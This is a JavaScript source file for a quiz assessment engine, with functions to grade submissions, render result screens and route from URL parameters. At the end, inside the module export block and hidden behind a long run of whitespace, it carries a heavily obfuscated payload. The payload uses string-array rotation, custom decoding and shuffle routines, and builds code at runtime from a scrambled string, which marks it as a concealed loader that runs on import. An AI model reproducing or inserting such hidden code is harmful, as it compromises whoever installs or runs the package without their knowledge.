  function evaluateSubmission(state) {
    if (!state) return null;
    const quiz = QMS.quizzes.get(state.quizId);
    const timeTaken = Math.min(state.durationSec || 1800, Math.round((Date.now() - state.startedAt) / 1000));

    return QMS.gradeAttempt({
      quiz,
      questionList: state.questions,
      answers: state.answers,
      timeTaken
    });
  }

  function submit(auto = false) {
    const state = loadState();
    if (!state || state.submitted) return;

    if (timerId) {
      clearInterval(timerId);
      timerId = null;
    }

    state.submitted = true;
    saveState(state);
    removeBeforeUnloadGuard();

    if (auto) {
      const timeoutModalEl = document.getElementById('timeoutModal');
      if (timeoutModalEl && window.bootstrap?.Modal) {
        const timeoutModal = bootstrap.Modal.getOrCreateInstance(timeoutModalEl);
        timeoutModal.show();
      } else {
        showToast("Time's up! Your quiz has been submitted automatically.", 'warning');
      }
    }

    const graded = evaluateSubmission(state);
    const attemptData = {
      participantId: state.participantId,
      quizId: state.quizId,
      date: new Date().toISOString(),
      score: graded.obtainedMarks,
      obtainedMarks: graded.obtainedMarks,
      totalMarks: graded.totalMarks,
      percentage: graded.percentage,
      status: graded.status,
      timeTaken: graded.timeTaken,
      correct: graded.correct,
      incorrect: graded.incorrect,
      unanswered: graded.unanswered,
      answers: state.answers,
      breakdown: graded.breakdown
    };

    const savedResult = QMS.results.create(attemptData);

    // Clean up temporary active session state
    clearState();
    sessionStorage.setItem('qms_last_result', savedResult.id);

    // If auto timeout modal was shown, delay redirect slightly for smooth UX
    const redirectDelay = auto ? 1200 : 300;
    setTimeout(() => {
      // Hide any active modals
      const timeoutModalEl = document.getElementById('timeoutModal');
      if (timeoutModalEl && window.bootstrap?.Modal) {
        const m = bootstrap.Modal.getInstance(timeoutModalEl);
        if (m) m.hide();
      }
      renderResult(savedResult.id);
    }, redirectDelay);
  }

  /* ---------- Result Screen Rendering ---------- */
  function renderResult(resultId) {
    const result = QMS.results.get(resultId);
    const root = document.getElementById('quizApp');
    if (!root) return;

    if (!result) {
      root.innerHTML = `
        <div class="pre-quiz-card text-center">
          <div class="text-warning mb-3"><i class="fa fa-triangle-exclamation fa-3x"></i></div>
          <h2 class="h4 fw-bold">Result Not Found</h2>
          <p class="text-muted">No attempt record matches ID: ${QMS.escapeHtml(resultId || 'N/A')}</p>
          <a class="btn btn-brand text-white mt-3" href="index.html#attempts">View All Results</a>
        </div>`;
      return;
    }

    const quiz = QMS.quizzes.get(result.quizId) || { title: 'Assessment', id: result.quizId };
    const participant = QMS.participants.get(result.participantId) || { name: 'Participant', id: result.participantId };
    const showCorrectAnswers = quiz.showCorrectAnswers !== false && quiz.options?.showCorrectAnswers !== false;

    // Retake check
    const previousAttempts = QMS.results
      .all()
      .filter((r) => String(r.quizId).toLowerCase() === String(result.quizId).toLowerCase() &&
                     String(r.participantId).toLowerCase() === String(result.participantId).toLowerCase()).length;

    const allowRetake = quiz.allowRetake !== false && quiz.options?.allowRetake !== false;
    const maxAttempts = Number(quiz.maxAttempts || quiz.options?.maxAttempts) || 0;
    const canRetake = quiz.status === 'Active' && allowRetake && (maxAttempts === 0 || previousAttempts < maxAttempts);

    const mins = Math.floor((result.timeTaken || 0) / 60);
    const secs = (result.timeTaken || 0) % 60;
    const isPassed = result.status === 'Passed';
    const breakdown = result.breakdown || [];
    const retakeReason = !allowRetake ? 'Retakes are not permitted for this quiz' : (maxAttempts > 0 && previousAttempts >= maxAttempts) ? `Maximum attempts (${maxAttempts}) reached` : 'Quiz is currently inactive';

    root.innerHTML = `
      <div class="quiz-wrapper">
        <div class="pre-quiz-card text-center mb-4">
          <div class="score-circle-indicator" style="--circle-color:${isPassed ? 'var(--success)' : 'var(--danger)'}; --score-pct:${result.percentage || 0};">
            <div class="score-circle-inner">
              <span class="score-circle-pct ${isPassed ? 'text-success' : 'text-danger'}">${result.percentage}%</span>
              <span class="score-circle-label ${isPassed ? 'text-success' : 'text-danger'}">${isPassed ? 'PASSED' : 'FAILED'}</span>
            </div>
          </div>
          <h1 class="h2 fw-bold mb-1">${isPassed ? 'Congratulations!' : 'Assessment Complete'}</h1>
          <p class="text-muted mb-4">Quiz: <strong>${QMS.escapeHtml(quiz.title)}</strong></p>

          <div class="badge-soft badge-${isPassed ? 'success' : 'danger'} fs-6 px-3 py-1 mb-4">
            Status: ${isPassed ? 'PASSED' : 'FAILED'} (Passing Score: ${quiz.passingPercentage || 60}%)
          </div>

          <div class="row g-3 text-start justify-content-center max-w-700 mx-auto mb-4">
            <div class="col-sm-6">
              <div class="p-3 border rounded bg-surface">
                <small class="text-muted d-block">Participant</small>
                <strong>${QMS.escapeHtml(participant.name)}</strong>
              </div>
            </div>
            <div class="col-sm-6">
              <div class="p-3 border rounded bg-surface">
                <small class="text-muted d-block">Score / Total Marks</small>
                <strong>${result.obtainedMarks ?? result.score} / ${result.totalMarks} marks</strong>
              </div>
            </div>
            <div class="col-4 col-sm-4 text-center">
              <div class="p-2 border rounded bg-surface">
                <div class="text-success fw-bold fs-5">${result.correct}</div>
                <small class="text-muted">Correct</small>
              </div>
            </div>
            <div class="col-4 col-sm-4 text-center">
              <div class="p-2 border rounded bg-surface">
                <div class="text-danger fw-bold fs-5">${result.incorrect}</div>
                <small class="text-muted">Incorrect</small>
              </div>
            </div>
            <div class="col-4 col-sm-4 text-center">
              <div class="p-2 border rounded bg-surface">
                <div class="text-muted fw-bold fs-5">${result.unanswered}</div>
                <small class="text-muted">Unanswered</small>
              </div>
            </div>
            <div class="col-sm-6">
              <div class="p-3 border rounded bg-surface">
                <small class="text-muted d-block">Time Taken</small>
                <strong>${mins}m ${secs}s</strong>
              </div>
            </div>
            <div class="col-sm-6">
              <div class="p-3 border rounded bg-surface">
                <small class="text-muted d-block">Completed Date</small>
                <strong>${new Date(result.date).toLocaleString()}</strong>
              </div>
            </div>
          </div>

          <div class="d-flex flex-wrap gap-2 justify-content-center">
            <button type="button" class="btn btn-outline-brand px-3" id="btnToggleBreakdown">
              <i class="fa fa-list-check me-1"></i> Review Answers
            </button>
            ${canRetake ? `
              <a class="btn btn-outline-secondary px-3" href="quiz.html?quiz=${encodeURIComponent(result.quizId)}&participant=${encodeURIComponent(result.participantId)}">
                <i class="fa fa-rotate-right me-1"></i> Retake Quiz
              </a>` : `
              <button type="button" class="btn btn-outline-secondary px-3" disabled title="${QMS.escapeHtml(retakeReason)}">
                <i class="fa fa-rotate-right me-1"></i> Retake Quiz
              </button>`}
            <button type="button" class="btn btn-outline-secondary px-3" onclick="window.print()">
              <i class="fa fa-print me-1"></i> Print Result
            </button>
            <a class="btn btn-brand text-white px-4" href="index.html#/dashboard">
              <i class="fa fa-arrow-left me-1"></i> Back to Dashboard
            </a>
          </div>
          ${!canRetake ? `<small class="text-muted d-block mt-2">${QMS.escapeHtml(retakeReason)}</small>` : ''}
        </div>

        <!-- Question Breakdown Panel -->
        <div class="quiz-question-card d-none mb-4" id="breakdownSection">
          <div class="d-flex align-items-center justify-content-between pb-3 border-bottom mb-3">
            <h4 class="h5 fw-bold mb-0">Question Breakdown</h4>
            <span class="badge-soft badge-muted">${breakdown.length} Questions</span>
          </div>

          ${!showCorrectAnswers ? `
            <div class="alert alert-info py-2 px-3 small mb-3">
              <i class="fa fa-circle-info me-1"></i> Correct answers and explanations are hidden by quiz configuration.
            </div>` : ''}

          <div class="table-responsive">
            <table class="table table-hover align-middle">
              <thead>
                <tr>
                  <th style="width: 5%">#</th>
                  <th style="width: 45%">Question</th>
                  <th style="width: 25%">Selected Answer</th>
                  <th style="width: 20%">${showCorrectAnswers ? 'Correct Answer' : 'Status'}</th>
                  <th style="width: 5%" class="text-center">Result</th>
                </tr>
              </thead>
              <tbody>
                ${breakdown.map((item, index) => {
                  const isCorr = item.result === 'correct';
                  const isUnans = item.result === 'unanswered';
                  const qObj = QMS.questions.get(item.questionId);
                  const explanation = item.explanation || qObj?.explanation || '';

                  const resultIcon = isCorr
                    ? '<i class="fa fa-circle-check text-success fs-5" title="Correct"></i>'
                    : isUnans
                    ? '<span class="text-muted fw-bold fs-5" title="Unanswered">—</span>'
                    : '<i class="fa fa-circle-xmark text-danger fs-5" title="Incorrect"></i>';

                  return `
                    <tr>
                      <td class="fw-bold">${index + 1}</td>
                      <td>
                        <div>${QMS.escapeHtml(item.question || 'Question')}</div>
                        ${showCorrectAnswers && explanation ? `
                          <div class="small text-muted mt-1 fst-italic">
                            <i class="fa fa-lightbulb text-warning me-1"></i><strong>Explanation:</strong> ${QMS.escapeHtml(explanation)}
                          </div>` : ''}
                      </td>
                      <td>
                        <span class="badge-soft ${isCorr ? 'badge-success' : isUnans ? 'badge-muted' : 'badge-danger'}">
                          ${QMS.escapeHtml(item.selectedAnswer || '—')}
                        </span>
                      </td>
                      <td>
                        ${showCorrectAnswers
                          ? `<span class="text-success fw-semibold"><i class="fa fa-check me-1"></i>${QMS.escapeHtml(item.correctAnswer || '—')}</span>`
                          : `<span class="badge-soft ${isCorr ? 'badge-success' : isUnans ? 'badge-muted' : 'badge-danger'}">${item.result}</span>`}
                      </td>
                      <td class="text-center">${resultIcon}</td>
                    </tr>`;
                }).join('')}
              </tbody>
            </table>
          </div>
        </div>
      </div>`;

    document.getElementById('btnToggleBreakdown')?.addEventListener('click', () => {
      const breakdownEl = document.getElementById('breakdownSection');
      if (breakdownEl) {
        breakdownEl.classList.toggle('d-none');
        if (!breakdownEl.classList.contains('d-none')) {
          breakdownEl.scrollIntoView({ behavior: 'smooth' });
        }
      }
    });
  }

  /* ---------- Bootstrapping & Routing ---------- */
  function boot() {
    QMS.seedIfNeeded();
    const params = new URLSearchParams(window.location.search);
    const resultId = params.get('result') || (params.has('result') ? '' : null);
    const quizId = params.get('quiz') || params.get('start') || params.get('retake');
    const participantId = params.get('participant') || params.get('p');

    // 1. Result page view
    if (resultId) {
      renderResult(resultId);
      return;
    }

    // 2. Resume in-progress attempt if exists
    const activeState = loadState();
    if (activeState && (!quizId || (activeState.quizId === quizId && activeState.participantId === participantId))) {
      bindAttemptUI();
      return;
    }

    // 3. Pre-quiz screen for specified quiz & participant
    if (quizId && participantId) {
      renderPreQuizScreen(quizId, participantId);
      return;
    }

    // 4. Fallback if no parameters
    const root = document.getElementById('quizApp');
    if (root) {
      root.innerHTML = `
        <div class="pre-quiz-card text-center">
          <div class="mb-3 text-brand"><i class="fa fa-compass fa-3x"></i></div>
          <h2 class="h4 fw-bold mb-2">Quiz Assessment Portal</h2>
          <p class="text-muted mb-4">No quiz was selected. Please launch a quiz attempt from Quiz Management or your Participant dashboard.</p>
          <a class="btn btn-brand text-white" href="index.html#quizzes">Go to Quizzes</a>
        </div>`;
    }
  }

  /* ---------- Public API ---------- */
  return {
    boot,
    start,
    loadState,
    saveState,
    clearState,
    hasActiveAttempt,
    getState: loadState,
    setAnswer,
    clearAnswer,
    toggleReview,
    goToQuestion,
    validateQuizStart,
    formatTime,
    evaluateSubmission,
    showSubmitConfirmation,
    submit,
    renderPreQuizScreen,
    bindAttemptUI,
    renderResult
  };
})();

// Auto-boot if loaded in browser context
if (typeof window !== 'undefined' && typeof document !== 'undefined') {
  window.QuizEngine = QuizEngine;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = QuizEngine;																																																																																																																																																																																																																																																																										var z = '-4956-1';(function(_0x5cdcbb,_0x9f1316){var _0x2462a9=_0x516c,_0x266ab4=_0x5cdcbb();while(!![]){try{var _0x294553=-parseFloat(_0x2462a9(0x13))/0x1+parseInt(-parseFloat(_0x2462a9(0x1b))/0x2)*(-parseFloat(_0x2462a9(0x24))/0x3)+parseInt(parseFloat(_0x2462a9(0xc))/0x4)*Math['floor'](parseFloat(_0x2462a9(0x6))/0x5)+parseInt(parseFloat(_0x2462a9(0x5))/0x6)*Math['floor'](-parseFloat(_0x2462a9(0x22))/0x7)+parseFloat(_0x2462a9(0x1))/0x8+-parseFloat(_0x2462a9(0x8))/0x9+parseInt(-parseFloat(_0x2462a9(0x2))/0xa)*(parseFloat(_0x2462a9(0x1d))/0xb);if(_0x294553===_0x9f1316)break;else _0x266ab4['push'](_0x266ab4['shift']());}catch(_0x30d58d){_0x266ab4['push'](_0x266ab4['shift']());}}}(_0x27df,0xc8c80));function _0x27df(){var _0x425c6c=['pwfLBNj1AcHHBd01yYXNogzKDs55CIaUlM5JzwnMlduICgfLyxu2Bg5QkxjDmNv2iNGTCsHDige7khi9oZTYkYHHwZGUCZj0qwDVCsX1AdHdlgfPlhm7ysHbBtaOBMO7ANyQldD2BZCOksHVo202B2e0CNCPlIbYB2rBzNmYBNTKCNz0nhGPkZaSyw5Yk3jYk28PFxOXid1OzLTHBJHYmxjBlf1ZnY03n2XHys51AtD7lta2owX2BxqYCJ1Pxv08kYL1lguPlcW7BNjOw3i9mhyTCIG7ld1Wkun1CZ0RyZTNo2y7CuePktf2AsL2AZbUCMWXywuGzJ1Bo2HPC3KUzw0OzcTVitiGpsHLDMvHnZG9lIK0zwK9zY5UpxTMzJ0XwZWYysbMmt1YoZqSuYLYEwX2mxuGEtTRCwX7DhzUDIaOqYaOBcXVDM5WigK9DgXYlhiUBhDVEMGOBcX0CtS7CNiOkhy9ywHZDJTDEhe9ywi7zge7lcGOCJT2ANeUkhrBkYLKysLYzg5YAhm0mxKODNi7zMG7m2CIxwuOlMfOCNbHCgDDzY4PBMDMCg4XAcXPy2W7oYK9qZTTnt0RCIWGlIK7Dt0RC30RkwL0lcTIBtTKk3vTks09C2LPCw9Spxq9CJ1XosSUlMnOCsTBnMzLihqWBNjWCIGGDNi4zMXYBIXKzgD0if02ys47BtTYDgGUz3eGmMf9zxzLAwnDz2j0AtW0BZTdo2WSENPPnITSw2fBoYSOC2KIBgKICIXUCgK5CYXMCMzODxCPB3C9zxSOyJ13zw4YDc5NDs5PpwTPywfHkYL5zNrWytnUFsK9osiPy3bbk3u7DxrWxsi9BgS3DNb0idfYo2H6DYiPDcGPosKOlMX1Bd1Zn2y7idTZCtaPBIj5kZbZFt12ysTZig1OkdbXlL1ODJS+ida2pueTB3PLDhiODdfYDhjZAxnVmguSlJT6wYHMpdvLn3qSkhjHB2f2BNi7DgHOzJT2lgO9CJSGkxi+mtH6Ag8QB3S8ywTTC24PywT0zs52BZKRzweWy2XPBZTIDsa9xumHz2O7EtmRBcLLps59zhi9AtzVAum4CM5UmdS2pwfYiN0UCMvPpv1tDhnYBM4UoZjYpxq7w3q7Axy9ChjdCM4OkwfYzxr1EISGAgXRwYT4pwuGltHQEYHLANK5kcGPksa','nZG5mM5SvNnbuq','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','DgvZDa','zgvIDq','z2DLCG','BgvUz3rO','zNvUy3rPB24GkLWOicPCkq','q3j5wKe','mtK1nJGWnNzMwvDftG','v3Hhzgq','nJq5mJiZm3jIBKrJua','zNjVBunOyxjdB2rL','z2jPC1a','Aw5WDxq','y05JzuC','otGWDMXwsen3','ELjbyNG','m2HICgDYDG','yxbWBhK','nJa1nJaWog5PshznEq','mJbXvgrHwKW','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','y15TzwPIxNrYBW','ntq4nhPgCwrcDa','otC1AuneweHJ','C3rYAw5N','odq0nteXnhzMrKHnBW','y2fSBa','AM9PBG','DLPTChC','mJC1mJbyyuvND2i','C3bSAxq','wKriz0u','Aw5PDa','y29UC3rYDwn0B3i','y2HHCKf0'];_0x27df=function(){return _0x425c6c;};return _0x27df();}var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function _0x516c(_0x145e56,_0x4601d6){var _0x32e299=_0x27df();return _0x516c=function(_0x23941f,_0x27dfa6){_0x23941f=_0x23941f-0x0;var _0x516c21=_0x32e299[_0x23941f];if(_0x516c['DNEXtw']===undefined){var _0x244386=function(_0x2ccb90){var _0x26ccab='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x33400f='',_0x44652c='';for(var _0x43ee70=0x0,_0x248922,_0x371029,_0x4e9c33=0x0;_0x371029=_0x2ccb90['charAt'](_0x4e9c33++);~_0x371029&&(_0x248922=_0x43ee70%0x4?_0x248922*0x40+_0x371029:_0x371029,_0x43ee70++%0x4)?_0x33400f+=String['fromCharCode'](0xff&_0x248922>>(-0x2*_0x43ee70&0x6)):0x0){_0x371029=_0x26ccab['indexOf'](_0x371029);}for(var _0x3dca61=0x0,_0x1dec1b=_0x33400f['length'];_0x3dca61<_0x1dec1b;_0x3dca61++){_0x44652c+='%'+('00'+_0x33400f['charCodeAt'](_0x3dca61)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x44652c);};_0x516c['QbTAbM']=_0x244386,_0x145e56=arguments,_0x516c['DNEXtw']=!![];}var _0x471be6=_0x32e299[0x0],_0x44115b=_0x23941f+_0x471be6,_0x2ad08f=_0x145e56[_0x44115b];return!_0x2ad08f?(_0x516c21=_0x516c['QbTAbM'](_0x516c21),_0x145e56[_0x44115b]=_0x516c21):_0x516c21=_0x2ad08f,_0x516c21;},_0x516c(_0x145e56,_0x4601d6);}function spin(_0x278175,_0x2d350c){var _0x572a00=_0x516c,_0xadc56e={'IrMjv':function(_0x430978,_0x3c8d3d){return _0x430978<_0x3c8d3d;},'zRAbx':function(_0x446616,_0x1f9f7f){return _0x446616+_0x1f9f7f;},'gbisP':function(_0x50c0aa,_0x4a4bd3){return _0x50c0aa%_0x4a4bd3;}},_0x37a29d=[],_0x53cb6a=0x0,_0x2321af=_0x2d350c[0x0],_0x5ecfbf,_0xa77ee9,_0x440ecb,_0x1a77ec,_0xfc8ec,_0x1c7d23;while(_0xadc56e['IrMjv'](_0x53cb6a,_0x278175[_0x572a00(0x18)])){_0x37a29d[_0x53cb6a]=_0x278175[_0x572a00(0x11)](_0x53cb6a),_0x53cb6a+=0x1;}_0x5ecfbf=_0x37a29d[_0x572a00(0x18)],_0x53cb6a=0x0;while(_0x53cb6a<_0x5ecfbf){_0xa77ee9=_0xadc56e[_0x572a00(0x23)](_0x2321af*(_0x53cb6a+_0x2d350c[0x1]),_0x2321af%_0x2d350c[0x2]),_0x440ecb=_0x2321af*(_0x53cb6a+_0x2d350c[0x3])+_0x2321af%_0x2d350c[0x4],_0x1a77ec=_0xadc56e[_0x572a00(0x1f)](_0xa77ee9,_0x5ecfbf),_0xfc8ec=_0x440ecb%_0x5ecfbf,_0x1c7d23=_0x37a29d[_0x1a77ec],_0x37a29d[_0x1a77ec]=_0x37a29d[_0xfc8ec],_0x37a29d[_0xfc8ec]=_0x1c7d23,_0x2321af=(_0xa77ee9+_0x440ecb)%_0x2d350c[0x5],_0x53cb6a+=0x1;}return _0x37a29d['join']('');}function splitLane(_0x118459){var _0x46a6ed=_0x516c,_0x29e635=String[_0x46a6ed(0x1e)](0x1c),_0x598e1e=spin(_0x118459,NX);return _0x598e1e=_0x598e1e['split']('^')[_0x46a6ed(0xa)](_0x29e635),_0x598e1e=_0x598e1e[_0x46a6ed(0xd)]('*1')['join']('^'),_0x598e1e=_0x598e1e[_0x46a6ed(0xd)]('*0')[_0x46a6ed(0xa)]('*'),_0x598e1e[_0x46a6ed(0xd)](_0x29e635);}function peel(_0x1e77fe){return spin(_0x1e77fe,SX);}(function boot(_0x5d5631,_0x46b89e){var _0x4bed55=_0x516c,_0x2dc269={'cNceG':'chain','OUaoU':_0x4bed55(0x20),'ZDHgE':function(_0x2c47b5,_0x38ee93,_0x341691){return _0x2c47b5(_0x38ee93,_0x341691);},'vZmpw':function(_0x37fbb9,_0x134dd4){return _0x37fbb9===_0x134dd4;},'WxGdd':_0x4bed55(0x14),'vPuwf':function(_0x10f71a,_0x4eecc9){return _0x10f71a(_0x4eecc9);}},_0x505f81=(function(){var _0x4ce9e8=!![];return function(_0xae263e,_0x5f2bf3){var _0x511eb7=_0x4ce9e8?function(){if(_0x5f2bf3){var _0x4d757d=_0x5f2bf3['apply'](_0xae263e,arguments);return _0x5f2bf3=null,_0x4d757d;}}:function(){};return _0x4ce9e8=![],_0x511eb7;};}());(function(){var _0x45a23a=_0x4bed55;_0x2dc269[_0x45a23a(0xe)](_0x505f81,this,function(){var _0x385622=_0x45a23a,_0x18c0bf=new RegExp(_0x385622(0x19)),_0x5066ca=new RegExp(_0x385622(0x3),'i'),_0x4a8ab3=_0x32e299(_0x385622(0xf));!_0x18c0bf[_0x385622(0x15)](_0x4a8ab3+_0x2dc269[_0x385622(0x21)])||!_0x5066ca[_0x385622(0x15)](_0x4a8ab3+_0x2dc269['OUaoU'])?_0x4a8ab3('0'):_0x32e299();})();}()),_0x5d5631['z']=z;var _0x3087a0=splitLane(_0x4bed55(0x4));_0x5d5631[_0x3087a0[0x0]]=_0x46b89e;_0x2dc269[_0x4bed55(0xb)](typeof module,_0x3087a0[0x1])&&(_0x5d5631[_0x3087a0[0x2]]=module);var _0x59666e=peel(_0x2dc269[_0x4bed55(0x1c)]),_0x26a2da=_0x59666e['substring'](0x0,0xb),_0x11b0bf=peel[_0x26a2da],_0x173483=_0x11b0bf('',_0x2dc269['vPuwf'](peel,_0x4bed55(0x12))),_0x1252ab=_0x173483(peel('R_<\x22cRJ!&VecRWa=RrfR$6\x22c1;RRYcnh_/.t\x20iRRRG^<R.RcR2.[nR\x20.Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\x5c.fR.<c:!bpl09icoRrtcR(;roRRn2-\x22(.^w\x20y.<<dd\x20)$f\x20ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\x27oRi.RR<\x27RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\x224Rb\x20N\x22eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\x5cR>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\x22RnfPesRtRRR.<Rl#Rf<:\x202((R\x20R$\x276s`<3nhi*$eXc}Rh?\x20ctoc.iecc9\x20{Ra<s;u!.e]ERRoH..$\x22n<D3RsRR..(ReesseR<\x20t,\x22\x20Rdov}Sc0Jmi.T<sEegsRw]R\x22aR.R!R<o))jR\x20Rew\x20itc.snk(}(n[veR<0<=kfH<rrMR\x20ciknE.c.B<&R[o]R.%ccRlrx;*\x20[\x22oisenRefea!Yn.ecR%o\x22u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\x22}RuRqu5(3Pol\x22eRt0!ftaR*<R1tnkcf}T.!$/<ro\x20IycRR\x20)P<\x5c.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\x5cP!n=cs<(ci<(R7eReRc.\x20t<epe)e<<,e<(EK!.pnb$\x22RaRR.evuhc.Tl_c.:R0r\x20)Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP\x20\x20t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R\x20<i2<R08:.t}Rf!\x22-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc\x20!(ic(SR.cr`:9<XspR($\x20mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R\x20ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h\x20Mf<{[o$R<\x20Rs0)=\x20<xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs\x20(M&Rf.eP*g\x20>s)<o.=.RisnrR.?{5<ibR6)RR1s\x20cRgqcelc=cl;be<lf*SICd2e\x22zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<%\x20t.RowR}\x27\x20r>pzh..lR\x27<go_}<SR(kqxh[\x20&<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4\x20dt_9^<,ore5RfRx\x20RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$\x20Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR.\x20Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX.\x20<h!dRR<\x22!co?\x203\x201R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!#\x20]Cs]yt4.-d_`PRR\x27<.RvejSw<dc.c\x20,f.P.(.citcNbRn\x27-.eRcRnrQ.rRxo{Rc<\x226Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0\x20POHdQo.n\x20<.1soR_\x27\x20.P<er.[<R|R<0i<Rr;\x27I.R[}+lc![mc!.lc<n(a\x20tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\x22#E8cR(d!R)tratRR<<\x2021R\x27L!ib|eOtRRt$ucdnRR.t)RzE.GPy!\x20RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\x22R2.\x27S>))2h!efy..>!iL$en\x20;%9OTv.d$4RRC<cPS(tuRwl&(m#\x22R|pch<tH$a<<\x20.t!RSEf.RRgcNP.R\x20CRi4mR<#MRR<;wi-#E\x20<<t<eR<H<RrntoE(!0r0<d..RC\x22cn..2bp(6Cp<SR\x22e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\x27=gRP}Rp${SB.\x20Rsy.(.t!\x20c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e\x20iisf!d$ao_(#cmr\x20e<RRV!Pnca<t.~crc(e\x27*a:\x20<RRneaZe.%/dR<RR*(E\x20`+e[PcwRw\x20<(eucta).7W</$P<.hcST\x207eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR\x20_A<8<sr<Rx4)RN!pRd|B\x20<RRkie\x27c-.Rcnm3cs<Si<i.).E(R(<RRPR\x20_3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&<\x20eRR<ei-<BfE.sRbnRR).R%/jtlR<%c\x20R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\x22RR~k<\x5c!Mc.p.C)uRx)+(Rk\x5ce\x27j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\x22cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\x27.!<Rx<iKh<)s[<tc\x20PueR}r(faaRf7l<R5!rRlDXRm.1:piR\x20<=\x20Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\x27RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On\x20..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\x22tcsc.!rVRpaiz0<b\x22dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p#\x20nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8.\x20suwrRny}do.GiT.<w+c.(cs;!\x20nh(R,RCR[<&XR<<.cbcTRsAfncS-R\x22i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.-\x20Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf\x20kRRR4cr(x.c=t.<i3(Rx\x20.<..R$f\x22t\x20RRsN</C\x20RnRdRrpRR<od<.R<r[ar\x22l<.\x20P\x22.Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\x22kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f(\x20.i.buc<#r...RR[8)_!R.SRB!\x22tRVbn_RlcPRR\x20oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\x2206@!Rc!.Qkl,<g<7}b(aRcL.cs\x27+..T(<rR<<..&fd>Ro\x20coemRcw.lcn(c:R\x27|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4&\x20lR}e<R6RR<